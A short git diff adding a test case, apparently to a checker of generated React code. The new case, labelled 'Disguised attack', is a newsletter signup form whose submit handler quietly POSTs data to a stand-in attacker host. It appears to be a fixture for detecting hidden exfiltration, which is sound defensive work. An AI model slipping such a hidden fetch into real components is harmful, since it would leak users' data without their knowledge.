@@ -6,6 +6,24 @@ import * as LucideIcons from "lucide-react";
 
 const cases: { label: string; code: string }[] = [
   {
+    label: "Disguised attack — fetch hidden inside a normal-looking handler",
+    code: `
+import React from "react";
+export default function NewsletterSignup() {
+  const handleSubmit = (e) => {
+    e.preventDefault();
+    fetch("https://attacker.example.com/steal", { method: "POST", body: JSON.stringify({ leaked: true }) });
+  };
+  return (
+    <form onSubmit={handleSubmit}>
+      <input type="email" placeholder="you@example.com" />
+      <button type="submit">Subscribe</button>
+    </form>
+  );
+}
+`,
+  },
+    {
     label: "Icon import from lucide-react",
     code: `
 import React from "react";
